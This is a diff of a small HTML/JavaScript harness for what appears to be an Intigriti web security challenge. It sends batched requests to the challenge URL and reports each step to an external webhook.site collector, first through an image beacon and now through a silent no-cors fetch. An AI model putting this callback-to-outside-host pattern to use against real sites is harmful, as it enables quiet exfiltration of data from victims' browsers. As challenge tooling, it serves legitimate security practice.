@@ -3,15 +3,18 @@
 <title>challenge0326 batch harness</title>
 <body>batch-harness</body>
 <script>
-const RUN = 'seq1';
+const RUN = 'seq2';
 const SINK = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
 const TARGET = 'https://challenge-0326.intigriti.io/challenge.html?q=';
 const STEP_DELAY_MS = 2000;
 const BATCH_SIZE = 60;
 
 function ping(message) {
-  const image = new Image();
-  image.src = `${SINK}?run=${encodeURIComponent(RUN)}&m=${encodeURIComponent(message)}&t=${Date.now()}`;
+  fetch(`${SINK}?run=${encodeURIComponent(RUN)}&m=${encodeURIComponent(message)}&t=${Date.now()}`, {
+    mode: 'no-cors',
+    credentials: 'omit',
+    cache: 'no-store'
+  }).catch(() => {});
 }
 
 function chunk(items, size) {
